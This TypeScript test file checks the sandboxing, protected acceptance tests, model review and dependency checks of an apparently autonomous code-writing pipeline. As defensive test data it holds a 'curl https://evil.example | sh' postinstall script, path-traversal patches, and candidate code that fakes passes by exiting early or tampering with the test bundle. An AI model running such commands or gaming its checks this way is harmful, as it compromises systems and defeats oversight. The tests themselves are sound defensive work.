import assert from 'node:assert/strict';
import { randomUUID } from 'node:crypto';
import { writeFile } from 'node:fs/promises';
import { after, test } from 'node:test';
import { collectChanges } from '../src/autonomy/collector.js';
import { SANDBOX_LABEL, runSandbox, sandboxPrefix } from '../src/autonomy/sandbox.js';
import { sha256Json } from '../src/autonomy/schema.js';
import { Docker, executeIsolated } from '../src/worker/docker.js';
import { fixture, source } from './worker-fixtures.js';

const docker = new Docker();
const image = process.env.FACTORY_TEST_WORKER_IMAGE ?? 'software-factory-worker:development';
const evidence: unknown[] = [];
const signal = () => new AbortController().signal;
async function clean(runId: string) {
  const filter = `label=${SANDBOX_LABEL}=${sandboxPrefix(runId)}`;
  assert.equal(await docker.checked(['ps', '-aq', '--filter', filter]), '');
  assert.equal(await docker.checked(['volume', 'ls', '-q', '--filter', filter]), '');
}
/** A real worker run against the fixture source; its patch is what the collector rebuilds. */
async function workerPatch(fixtureCommand?: string) {
  const archive = source();
  const job = fixture(archive, { tests: [], ...(fixtureCommand ? { fixtureCommand } : {}) });
  const run = await executeIsolated({ job, archive, runId: randomUUID(), image, signal: signal() });
  assert.equal(run.outcome.ok, true, JSON.stringify(run.outcome));
  return { archive, patch: run.outcome.patch };
}
after(async () => {
  if (process.env.AUTONOMY_EVIDENCE_PATH)
    await writeFile(process.env.AUTONOMY_EVIDENCE_PATH, `${JSON.stringify(evidence, null, 2)}\n`, {
      mode: 0o600,
    });
});

test('collector rebuilds the candidate tree from archive and patch, deterministically, in a hardened sandbox', async () => {
  const { archive, patch } = await workerPatch();
  const runId = randomUUID();
  let inspected = false;
  const first = await collectChanges({
    image,
    runId,
    archive,
    patch,
    signal: signal(),
  });
  const second = await collectChanges({
    image,
    runId: randomUUID(),
    archive,
    patch,
    signal: signal(),
  });
  assert.equal(first.candidateTree, second.candidateTree);
  assert.equal(first.baseTree, second.baseTree);
  assert.notEqual(first.baseTree, first.candidateTree);
  assert.equal(sha256Json(first.manifest), sha256Json(second.manifest));
  assert.equal(first.manifest.files.length, 1);
  const change = first.manifest.files[0];
  assert.equal(change?.status, 'modified');
  assert.equal(change?.newPath, 'sum.js');
  assert.equal(change?.binary, false);
  assert.match(change?.newContent ?? '', /a \+ b/);
  // OSS-22: the snapshot the reviewer receives holds the candidate tree's text files, changed or not.
  assert.equal(first.context.truncated, false);
  assert.ok(
    first.context.files.some((file) => file.path === 'sum.js' && /a \+ b/.test(file.content)),
  );
  assert.ok(first.context.files.length >= 2);
  assert.ok(first.context.files.every((file) => !file.path.startsWith('node_modules/')));
  assert.deepEqual(first.context, second.context);
  // Review round 1: a text file above the per-file cap must be omitted, never fail the run; secret-shaped
  // paths and secret material never reach the reviewer; files near the change come first.
  const wide = await collectChanges({
    image,
    runId: randomUUID(),
    archive: source({
      'sum.js': 'module.exports = (a, b) => a - b;\n',
      'lib/helper.js': 'module.exports = 1;\n',
      'docs/big.txt': 'x'.repeat(70_000),
      '.env': 'TOKEN=not-a-real-secret\n',
      'notes/key.txt':
        '-----BEGIN RSA ' + 'PRIVATE KEY-----\nsynthetic\n-----END RSA ' + 'PRIVATE KEY-----\n',
      'acceptance/suite.test.mjs': 'protected\n',
      'zz/last.js': 'module.exports = 2;\n',
    }),
    patch,
    protectedPaths: ['acceptance'],
    signal: signal(),
  });
  const paths = wide.context.files.map((file) => file.path);
  assert.equal(paths[0], 'sum.js', "the changed file's directory comes first");
  assert.ok(paths.includes('lib/helper.js') && paths.includes('zz/last.js'));
  for (const omitted of ['docs/big.txt', '.env', 'notes/key.txt', 'acceptance/suite.test.mjs']) {
    assert.ok(!paths.includes(omitted), omitted);
    assert.ok(wide.context.omitted.includes(omitted), omitted);
  }
  assert.equal(wide.context.omittedCount, wide.context.omitted.length);
  assert.equal(wide.context.truncated, false);
  assert.match(change?.oldContent ?? '', /a - b/);
  assert.deepEqual(first.blobs, {});
  await clean(runId);
  // Isolation is observed on a live sandbox, not inferred from the argument list.
  const probe = randomUUID();
  await runSandbox({
    image,
    runId: probe,
    entry: 'src/autonomy/sandbox/collector.ts',
    input: { archive: archive.toString('base64'), patch: '' },
    timeoutMs: 120_000,
    signal: signal(),
    onStarted: async (imageId) => {
      const state = JSON.parse(
        await docker.checked(['inspect', `${sandboxPrefix(probe)}-sandbox`]),
      )[0];
      assert.equal(state.Config.User, '1000:1000');
      assert.equal(state.HostConfig.NetworkMode, 'none');
      assert.equal(state.HostConfig.ReadonlyRootfs, true);
      assert.deepEqual(state.HostConfig.CapDrop, ['ALL']);
      assert.ok(state.HostConfig.SecurityOpt.includes('no-new-privileges:true'));
      assert.deepEqual(state.Mounts, []);
      assert.equal(state.Config.Labels[SANDBOX_LABEL], sandboxPrefix(probe));
      assert.ok(
        !state.Config.Env.some((entry: string) =>
          /GITHUB|POSTGRES|ANTHROPIC|DOCKER_HOST/.test(entry),
        ),
      );
      inspected = true;
      evidence.push({
        check: 'autonomy sandbox declaration',
        imageId,
        user: state.Config.User,
        network: state.HostConfig.NetworkMode,
        readOnly: true,
        bindMounts: 0,
        capabilities: state.HostConfig.CapDrop,
      });
    },
  });
  assert.ok(inspected);
  await clean(probe);
  evidence.push({
    check: 'collector determinism',
    candidateTree: first.candidateTree,
    manifestSha256: sha256Json(first.manifest),
    patchSha256: first.patchSha256,
  });
});

test('an empty patch yields the base tree and no changes', async () => {
  const archive = source();
  const runId = randomUUID();
  const collected = await collectChanges({ image, runId, archive, patch: '', signal: signal() });
  assert.equal(collected.candidateTree, collected.baseTree);
  assert.deepEqual(collected.manifest, { complete: true, files: [] });
  await clean(runId);
});

test('binary files, symlinks, mode changes and deletions are reported with the bytes the publisher needs', async () => {
  const { archive, patch } = await workerPatch(
    [
      "printf '\\x00\\x01\\x02\\xff' > image.bin",
      'ln -s sum.js link-to-sum',
      'chmod +x sum.js',
      'rm sum.test.js',
      "mkdir -p docs && printf 'added\\n' > docs/new.txt",
    ].join(' && '),
  );
  const runId = randomUUID();
  const collected = await collectChanges({ image, runId, archive, patch, signal: signal() });
  const byPath = new Map(
    collected.manifest.files.map((file) => [file.newPath ?? file.oldPath ?? '', file]),
  );
  const binary = byPath.get('image.bin');
  assert.equal(binary?.binary, true);
  assert.equal(binary?.newContent, null);
  assert.equal(
    Buffer.from(collected.blobs['image.bin'] ?? '', 'base64').toString('hex'),
    '000102ff',
  );
  const link = byPath.get('link-to-sum');
  assert.equal(link?.newMode, '120000');
  assert.equal(link?.newContent, null);
  assert.equal(Buffer.from(collected.blobs['link-to-sum'] ?? '', 'base64').toString(), 'sum.js');
  const executable = byPath.get('sum.js');
  assert.equal(executable?.oldMode, '100644');
  assert.equal(executable?.newMode, '100755');
  assert.equal(byPath.get('sum.test.js')?.status, 'deleted');
  assert.equal(byPath.get('docs/new.txt')?.status, 'added');
  assert.deepEqual(Object.keys(collected.blobs).sort(), ['image.bin', 'link-to-sum']);
  await clean(runId);
  evidence.push({ check: 'collector binary, symlink, mode and deletion handling', passed: true });
});

test('patches that escape the tree or touch git metadata are refused inside the sandbox', async () => {
  const archive = source();
  const hunk = (path: string) =>
    `diff --git a/${path} b/${path}\nnew file mode 100644\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n+injected\n`;
  for (const path of ['../escape.txt', '.git/config', '.git/hooks/pre-commit']) {
    const runId = randomUUID();
    await assert.rejects(
      collectChanges({ image, runId, archive, patch: hunk(path), signal: signal() }),
      /patch_apply_failed/,
    );
    await clean(runId);
  }
  const runId = randomUUID();
  await assert.rejects(
    collectChanges({ image, runId, archive, patch: 'not a patch', signal: signal() }),
    /patch_apply_failed/,
  );
  await clean(runId);
  evidence.push({ check: 'collector refuses traversal and git metadata', passed: true });
});

test('sandbox timeouts and cancellation remove the container', async () => {
  const archive = source();
  const slow = randomUUID();
  const started = Date.now();
  await assert.rejects(
    runSandbox({
      image,
      runId: slow,
      entry: 'src/autonomy/sandbox/collector.ts',
      // A 1 ms deadline expires before the entry can finish extraction.
      input: { archive: archive.toString('base64'), patch: '' },
      timeoutMs: 1,
      signal: signal(),
    }),
    /sandbox_timed_out|sandbox_process_failed/,
  );
  assert.ok(Date.now() - started < 30_000);
  await clean(slow);
  const cancelled = randomUUID();
  const controller = new AbortController();
  await assert.rejects(
    runSandbox({
      image,
      runId: cancelled,
      entry: 'src/autonomy/sandbox/collector.ts',
      input: { archive: archive.toString('base64'), patch: '' },
      timeoutMs: 120_000,
      signal: controller.signal,
      onStarted: async () => {
        setTimeout(() => controller.abort(), 200);
      },
    }),
    /sandbox_cancelled/,
  );
  await clean(cancelled);
  evidence.push({ check: 'sandbox deadline and cancellation cleanup', passed: true });
});

// --- Slice B: protected acceptance runner ---------------------------------------------
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadAcceptanceBundle, runAcceptance } from '../src/autonomy/acceptance.js';

const PROTECTED_TEST = `import assert from 'node:assert/strict';
import { test } from 'node:test';
import sum from '../../../sum.js';
test('sum adds', () => {
  assert.equal(sum(1, 2), 3);
});
`;
const TWO_TESTS = `import assert from 'node:assert/strict';
import { test } from 'node:test';
import sum from '../../../sum.js';
test('first', () => {
  assert.equal(sum(1, 2), 3);
});
test('second', () => {
  assert.equal(sum(2, 3), 5);
});
`;
const REPRODUCER = `import assert from 'node:assert/strict';
import { test } from 'node:test';
import sum from '../../../sum.js';
test('regression: 2 + 2', () => {
  assert.equal(sum(2, 2), 4);
});
`;
function bundleDirectory(
  files: Record<string, string>,
  harness: Record<string, unknown> = {
    version: 1,
    runner: { kind: 'node-test' },
    tests: ['tests/sum.test.mjs'],
    reproducer: 'tests/repro.test.mjs',
    timeoutMs: 60_000,
  },
) {
  const directory = mkdtempSync(join(tmpdir(), 'acceptance-bundle-'));
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(join(directory, path, '..'), { recursive: true });
    writeFileSync(join(directory, path), content);
  }
  // Pretty-printed on purpose: the harness digest must cover the operator's bytes, not a re-serialization.
  writeFileSync(join(directory, 'harness.json'), `${JSON.stringify(harness, null, 2)}\n`);
  return directory;
}
const SUBJECT = {
  repositoryId: 101,
  taskId: 'TASK_1',
  base: 'a'.repeat(40),
  tree: 'b'.repeat(40),
  changesSha256: '0'.repeat(64),
};
async function acceptance(
  fixtureCommand: string | undefined,
  bundle: Awaited<ReturnType<typeof loadAcceptanceBundle>>,
  intentKind: 'change' | 'bugfix' = 'bugfix',
) {
  const archive = source();
  let patch = '';
  if (fixtureCommand !== undefined) ({ patch } = await workerPatch(fixtureCommand));
  const collected = await collectChanges({
    image,
    runId: randomUUID(),
    archive,
    patch,
    signal: signal(),
  });
  return runAcceptance({
    image,
    archive,
    patch,
    baseTree: collected.baseTree,
    candidateTree: collected.candidateTree,
    subject: { ...SUBJECT, tree: collected.candidateTree },
    bundle,
    intentKind,
    signal: signal(),
  });
}

test('protected acceptance: a real fix passes the suite and its reproducer fails on base, passes on candidate', async () => {
  const directory = bundleDirectory({
    'tests/sum.test.mjs': PROTECTED_TEST,
    'tests/repro.test.mjs': REPRODUCER,
  });
  try {
    const bundle = await loadAcceptanceBundle(directory);
    assert.match(bundle.suiteSha256, /^[0-9a-f]{64}$/);
    assert.notEqual(bundle.suiteSha256, bundle.harnessSha256);
    const run = await acceptance("printf 'module.exports = (a, b) => a + b;\\n' > sum.js", bundle);
    assert.equal(run.receipt.status, 'passed', JSON.stringify(run));
    assert.deepEqual(run.receipt.protectedSuite, { total: 1, passed: 1, failed: 0, skipped: 0 });
    assert.deepEqual(run.receipt.reproducer, { baseline: 'failed', candidate: 'passed' });
    assert.equal(run.receipt.sourceModifiedByTests, false);
    assert.equal(run.receipt.suiteSha256, bundle.suiteSha256);
    assert.match(run.receipt.runnerImage, /^sha256:[0-9a-f]{64}$/);
    // The unfixed base fails the suite; nothing about the failure is inferred from output text.
    const unfixed = await acceptance(undefined, bundle);
    assert.equal(unfixed.receipt.status, 'failed');
    assert.deepEqual(unfixed.receipt.protectedSuite, {
      total: 1,
      passed: 0,
      failed: 1,
      skipped: 0,
    });
    assert.equal(unfixed.receipt.reproducer.candidate, 'failed');
    evidence.push({
      check: 'protected acceptance pass/fail from exit status and structured runner events',
      passed: run.receipt.protectedSuite,
      failed: unfixed.receipt.protectedSuite,
      reproducer: run.receipt.reproducer,
    });
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test('protected acceptance: candidate code cannot fake a pass by exiting early, editing source or touching the bundle', async () => {
  const directory = bundleDirectory({
    'tests/sum.test.mjs': TWO_TESTS,
    'tests/repro.test.mjs': REPRODUCER,
  });
  try {
    const bundle = await loadAcceptanceBundle(directory);
    // process.exit(0) during the second test: the child never reports completion, so the file fails.
    const earlyExit = await acceptance(
      "printf 'let calls = 0; module.exports = (a, b) => { if (++calls === 2) process.exit(0); return a + b; };\\n' > sum.js",
      bundle,
      'change',
    );
    assert.equal(earlyExit.receipt.status, 'failed', JSON.stringify(earlyExit.candidate));
    assert.equal(earlyExit.receipt.protectedSuite.failed, 1);
    // Candidate code that rewrites existing source when imported is reported.
    const editsSource = await acceptance(
      'printf \'require("fs").writeFileSync("sum.test.js", "tampered"); module.exports = (a, b) => a + b;\\n\' > sum.js',
      bundle,
      'change',
    );
    assert.equal(editsSource.receipt.sourceModifiedByTests, true);
    // Candidate code that alters the protected bundle invalidates the run.
    const tampers = await acceptance(
      'printf \'require("fs").appendFileSync(process.env.FACTORY_ACCEPTANCE_DIR + "/tests/sum.test.mjs", "//x"); module.exports = (a, b) => a + b;\\n\' > sum.js',
      bundle,
      'change',
    );
    assert.equal(tampers.receipt.status, 'error');
    assert.equal(tampers.reason, 'protected_suite_modified');
    // A candidate that ships its own .factory/acceptance cannot be tested at all.
    const collision = await acceptance(
      "mkdir -p .factory/acceptance && printf 'x' > .factory/acceptance/own",
      bundle,
      'change',
    );
    assert.equal(collision.receipt.status, 'error');
    assert.equal(collision.reason, 'acceptance_path_collision');
    evidence.push({
      check:
        'acceptance runner resists early exit, source edits, bundle tampering and path collision',
      passed: true,
    });
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test('protected acceptance: a generic command runner counts only exit status; bundles are validated', async () => {
  const passing = bundleDirectory(
    { 'tests/check.sh': 'exit 0\n' },
    {
      version: 1,
      runner: { kind: 'command', program: 'bash', args: [] },
      tests: ['tests/check.sh'],
      reproducer: null,
      timeoutMs: 30_000,
    },
  );
  const failing = bundleDirectory(
    { 'tests/check.sh': 'echo ok; exit 3\n' },
    {
      version: 1,
      runner: { kind: 'command', program: 'bash', args: [] },
      tests: ['tests/check.sh'],
      reproducer: null,
      timeoutMs: 30_000,
    },
  );
  const invalid = bundleDirectory(
    { 'tests/a.mjs': 'x' },
    {
      version: 1,
      runner: { kind: 'node-test' },
      tests: ['tests/missing.mjs'],
      reproducer: null,
      timeoutMs: 30_000,
    },
  );
  try {
    assert.equal(
      (await acceptance(undefined, await loadAcceptanceBundle(passing), 'change')).receipt.status,
      'passed',
    );
    const failed = await acceptance(undefined, await loadAcceptanceBundle(failing), 'change');
    assert.equal(failed.receipt.status, 'failed');
    assert.equal(failed.receipt.reproducer.baseline, 'not_run');
    await assert.rejects(loadAcceptanceBundle(invalid), /harness_test_missing/);
    await assert.rejects(
      loadAcceptanceBundle('relative/path'),
      /bundle_directory_must_be_absolute/,
    );
  } finally {
    for (const directory of [passing, failing, invalid])
      rmSync(directory, { recursive: true, force: true });
  }
});

// --- Slice D: fresh-context reviewer through the fixed-origin proxy ----------------------
import { ClaudeReviewer } from '../src/autonomy/reviewer.js';

class ReviewFixtureDocker extends Docker {
  override checked(args: string[], options?: Parameters<Docker['checked']>[1]) {
    return super.checked(
      args.map((value) =>
        value === 'src/worker/proxy.ts' ? 'test/worker-proxy-fixture.ts' : value,
      ),
      options,
    );
  }
}
test('model reviewer runs in a sandbox that never holds the key and returns only a validated verdict', async () => {
  const { archive, patch } = await workerPatch();
  const collected = await collectChanges({
    image,
    runId: randomUUID(),
    archive,
    patch,
    signal: signal(),
  });
  const request = {
    subject: { ...SUBJECT, tree: collected.candidateTree },
    intent: { title: 'Fix sum', body: 'sum must add its arguments.', kind: 'bugfix' as const },
    intentSha256: '1'.repeat(64),
    changes: collected.manifest,
    context: collected.context,
    acceptance: null,
    dependency: null,
  };
  const reviewer = (model: string) =>
    new ClaudeReviewer({
      docker: new ReviewFixtureDocker(),
      image,
      modelKey: 'synthetic-proxy-only-key',
      config: {
        adapter: 'claude',
        model,
        promptVersion: 1,
        maxTokens: 2048,
        maxDiffBytes: 1_000_000,
        maxContextBytes: 640 * 1024,
      },
      timeoutMs: 120_000,
    });
  const routine = await reviewer('claude-fixture-review').review(request, signal());
  assert.equal(routine.receipt.status, 'complete', JSON.stringify(routine));
  assert.equal(routine.receipt.risk, 'routine');
  assert.equal(routine.receipt.findings[0]?.severity, 'low');
  assert.equal(routine.receipt.context, 'fresh');
  assert.ok(routine.usage && routine.usage.output_tokens === 60);
  assert.ok(!JSON.stringify(routine).includes('synthetic-proxy-only-key'));
  const critical = await reviewer('claude-fixture-review-critical').review(request, signal());
  assert.equal(critical.receipt.risk, 'critical');
  assert.deepEqual(critical.receipt.categories, ['security_auth']);
  assert.equal(critical.receipt.findings[0]?.severity, 'high');
  const malformed = await reviewer('claude-fixture-review-malformed').review(request, signal());
  assert.equal(malformed.receipt.status, 'error');
  assert.equal(malformed.reason, 'verdict_not_json');
  // Review round 4: prose around the one object is handed over; two objects and a reply cut at the
  // token limit are not verdicts.
  const prose = await reviewer('claude-fixture-review-prose').review(request, signal());
  assert.equal(prose.receipt.status, 'complete');
  assert.equal(prose.receipt.risk, 'routine');
  const twoObjects = await reviewer('claude-fixture-review-two-objects').review(request, signal());
  assert.equal(twoObjects.receipt.status, 'error');
  assert.equal(twoObjects.reason, 'verdict_not_json');
  const cut = await reviewer('claude-fixture-review-truncated').review(request, signal());
  assert.equal(cut.receipt.status, 'error');
  assert.equal(cut.reason, 'verdict_truncated');
  assert.equal(
    await docker.checked(['ps', '-aq', '--filter', `label=${SANDBOX_LABEL}`]),
    '',
    'no reviewer or proxy containers remain',
  );
  evidence.push({
    check: 'fresh-context reviewer via synthetic provider',
    paidApi: false,
    statuses: [routine.receipt.status, critical.receipt.status, malformed.receipt.status],
    usage: routine.usage,
  });
});

// --- Slice E: npm resolution sandbox + dependency receipt --------------------------------
import { execFileSync } from 'node:child_process';
import { classifyChanges } from '../src/autonomy/classify.js';
import { decide } from '../src/autonomy/decision.js';
import { FixtureScanner, runDependencyVerification } from '../src/autonomy/dependency.js';
import { NOW, acceptanceFor, policyFixture, requestFor, reviewFor } from './autonomy-fixtures.js';

/** A real npm lockfile generated by the sandbox image's own npm, so re-resolution reproduces it. */
function realLockfile(manifest: Record<string, unknown>): string {
  const directory = mkdtempSync(join(tmpdir(), 'lockfile-'));
  try {
    writeFileSync(join(directory, 'package.json'), JSON.stringify(manifest, null, 2));
    execFileSync(
      'docker',
      [
        'run',
        '--rm',
        '--network',
        'bridge',
        '--user',
        '1000:1000',
        '-e',
        'HOME=/tmp',
        '-e',
        'npm_config_cache=/tmp/npm-cache',
        '--mount',
        `type=bind,src=${directory},dst=/work`,
        '-w',
        '/work',
        image,
        'npm',
        'install',
        '--package-lock-only',
        '--ignore-scripts',
        '--no-audit',
        '--no-fund',
      ],
      { stdio: ['ignore', 'ignore', 'inherit'], timeout: 180_000 },
    );
    return readFileSync(join(directory, 'package-lock.json'), 'utf8');
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}
test('npm resolution: a routine bump reproduces, is scanned and becomes routine; tampering and script changes hold', async () => {
  const before = { name: 'demo', version: '1.0.0', private: true, dependencies: { ms: '2.1.2' } };
  const after = { ...before, dependencies: { ms: '2.1.3' } };
  const lockBefore = realLockfile(before);
  const lockAfter = realLockfile(after);
  const archive = source({
    'package.json': JSON.stringify(before, null, 2),
    'package-lock.json': lockBefore,
    'index.js': "module.exports = require('ms');\n",
  });
  const heredoc = (name: string, content: string) =>
    `cat > ${name} <<'FACTORY_EOF'\n${content}\nFACTORY_EOF`;
  const bump = async (manifest: object, lock: string, extraCommand = 'true') => {
    const job = fixture(archive, {
      tests: [],
      fixtureCommand: `${heredoc('package.json', JSON.stringify(manifest, null, 2))}\n${heredoc('package-lock.json', lock.trimEnd())}\n${extraCommand}`,
    });
    const run = await executeIsolated({
      job,
      archive,
      runId: randomUUID(),
      image,
      signal: signal(),
    });
    assert.equal(run.outcome.ok, true, JSON.stringify(run.outcome));
    const collected = await collectChanges({
      image,
      runId: randomUUID(),
      archive,
      patch: run.outcome.patch,
      signal: signal(),
    });
    const policy = policyFixture({
      allowedPaths: ['.'],
      dependencies: {
        scanner: { adapter: 'fixture', image: FixtureScanner.IMAGE, databaseMaxAgeMs: 172_800_000 },
        holdSeverity: 'critical',
        licenseAllowlist: ['MIT', 'ISC'],
        allowNewDependencies: false,
        allowMajorUpgrades: false,
        allowDowngrades: false,
      },
    });
    const manifestPaths = classifyChanges(policy, collected.manifest)
      .reasons.filter((reason) => reason.code === 'dependency_manifest' && reason.path)
      .map((reason) => reason.path as string);
    const request = requestFor(policy, 'publish', collected.manifest, {
      tree: collected.candidateTree,
    });
    const subject = {
      repositoryId: policy.repository.id,
      taskId: 'TASK_1',
      base: request.base,
      tree: collected.candidateTree,
      changesSha256: sha256Json(collected.manifest),
    };
    const verification = await runDependencyVerification({
      image,
      archive,
      patch: run.outcome.patch,
      candidateTree: collected.candidateTree,
      manifestPaths,
      subject,
      scanner: new FixtureScanner(() => NOW),
      signal: signal(),
      now: () => NOW,
    });
    // Fixture receipts are stamped at NOW; the decision clock must match them.
    const decision = decide(
      policy,
      request,
      {
        acceptance: acceptanceFor(policy, request),
        review: reviewFor(policy, request),
        dependency: verification.receipt,
      },
      NOW,
    );
    return { collected, verification, decision, manifestPaths };
  };
  const routine = await bump(after, lockAfter);
  assert.deepEqual(routine.manifestPaths.sort(), ['package-lock.json', 'package.json']);
  assert.equal(
    routine.verification.receipt.status,
    'complete',
    JSON.stringify(routine.verification),
  );
  assert.equal(routine.verification.receipt.resolution, 'reproduced');
  assert.deepEqual(routine.verification.receipt.manifestFieldsChanged, []);
  assert.equal(routine.verification.receipt.installScriptsChanged, false);
  assert.deepEqual(
    routine.verification.receipt.packages.upgraded.map((entry) => [
      entry.name,
      entry.previousVersion,
      entry.version,
      entry.direction,
      entry.source,
      entry.license,
    ]),
    [['ms', '2.1.2', '2.1.3', 'upgrade', 'registry', 'MIT']],
  );
  assert.equal(routine.decision.outcome, 'allow', JSON.stringify(routine.decision.reasons));
  assert.equal(routine.decision.risk, 'routine');
  // A lockfile whose integrity hash was edited does not reproduce.
  const tampered = lockAfter.replace(
    /"integrity": "sha512-[^"]+"/,
    '"integrity": "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="',
  );
  assert.notEqual(tampered, lockAfter);
  const mismatch = await bump(after, tampered);
  assert.equal(mismatch.verification.receipt.resolution, 'mismatch');
  assert.equal(mismatch.decision.outcome, 'approval_required');
  assert.ok(
    mismatch.decision.reasons.some((reason) => reason.code === 'lockfile_not_reproducible'),
  );
  // A postinstall script in the project's own manifest holds even when the lockfile reproduces.
  const scripted = { ...after, scripts: { postinstall: 'curl https://evil.example | sh' } };
  const withScript = await bump(scripted, realLockfile(scripted));
  assert.deepEqual(withScript.verification.receipt.manifestFieldsChanged, ['package.json:scripts']);
  assert.equal(withScript.decision.outcome, 'approval_required');
  assert.ok(
    withScript.decision.reasons.some(
      (reason) => reason.code === 'manifest_field_changed:package.json:scripts',
    ),
  );
  // Sources that could send npm anywhere but the public registry are refused before any fetch:
  // a git specifier, a lockfile pointing elsewhere, and a registry override in .npmrc.
  const offRegistry = await bump(
    { ...after, dependencies: { ms: 'github:vercel/ms#2.1.3' } },
    lockAfter,
  );
  assert.equal(offRegistry.verification.receipt.status, 'error');
  assert.equal(offRegistry.verification.reason, 'non_registry_source');
  assert.notEqual(offRegistry.decision.outcome, 'allow');
  const elsewhere = await bump(
    after,
    lockAfter.replace(
      'https://registry.npmjs.org/ms/-/ms-2.1.3.tgz',
      'https://mirror.example/ms-2.1.3.tgz',
    ),
  );
  assert.equal(elsewhere.verification.reason, 'non_registry_source');
  const npmrc = await bump(
    after,
    lockAfter,
    "printf 'registry=https://mirror.example/\\n' > .npmrc",
  );
  assert.equal(npmrc.verification.reason, 'non_registry_source');
  assert.notEqual(npmrc.decision.outcome, 'allow');
  assert.equal(await docker.checked(['ps', '-aq', '--filter', `label=${SANDBOX_LABEL}`]), '');
  evidence.push({
    check: 'npm re-resolution, package delta and policy decision',
    offRegistryRefused: [offRegistry, elsewhere, npmrc].every(
      (run) => run.verification.reason === 'non_registry_source',
    ),
    reproduced: routine.verification.receipt.resolution,
    upgraded: routine.verification.receipt.packages.upgraded,
    tamperedResolution: mismatch.verification.receipt.resolution,
    scriptFields: withScript.verification.receipt.manifestFieldsChanged,
    paidApi: false,
  });
});

import { publicationBranch, publishCandidate } from '../src/autonomy/publisher.js';
// --- Slice F: the collector's tree is what the publisher builds ---------------------------
import { FixtureGitHost } from './git-host-fixture.js';

test('publisher rebuilds exactly the collector tree for text, binary, symlink, mode and deletion changes', async () => {
  const { archive, patch } = await workerPatch(
    [
      "printf '\\x00\\x01\\x02\\xff' > image.bin",
      'ln -s sum.js link-to-sum',
      'chmod +x sum.js',
      'rm sum.test.js',
      "mkdir -p docs && printf 'added\\n' > docs/new.txt",
      "printf 'module.exports = (a, b) => a + b;\\n' > sum.js",
    ].join(' && '),
  );
  const collected = await collectChanges({
    image,
    runId: randomUUID(),
    archive,
    patch,
    signal: signal(),
  });
  // The fixture host holds the same base files the worker received.
  const baseFiles: Record<string, { content: Buffer }> = {
    'sum.js': { content: Buffer.from('module.exports = (a, b) => a - b;\n') },
    'sum.test.js': {
      content: Buffer.from(
        "const assert = require('node:assert/strict');\nconst test = require('node:test');\nconst sum = require('./sum');\ntest('adds values', () => assert.equal(sum(2, 3), 5));\n",
      ),
    },
    'test_tools.py': {
      content: Buffer.from(
        'import unittest\nclass Tools(unittest.TestCase):\n    def test_arithmetic(self):\n        self.assertEqual(2 + 3, 5)\n',
      ),
    },
  };
  const host = new FixtureGitHost(
    { fullName: 'example/factory-demo', id: 101 },
    { fullName: 'example/factory-demo', id: 101 },
    baseFiles,
  );
  assert.equal(host.baseTree, collected.baseTree, 'fixture base tree equals the sandbox base tree');
  const publication = await publishCandidate(host, {
    base: host.baseCommit,
    candidateTree: collected.candidateTree,
    manifest: collected.manifest,
    blobs: collected.blobs,
    branch: publicationBranch(1, randomUUID()),
    baseBranch: 'main',
    title: 'Fix sum',
    body: 'task-ref: I_TASK_1\n',
    message: 'Fix sum',
    previousHead: null,
  });
  assert.equal(publication.tree, collected.candidateTree);
  assert.equal(publication.outcome, 'created');
  evidence.push({
    check: 'published tree equals collected candidate tree',
    tree: publication.tree,
  });
});
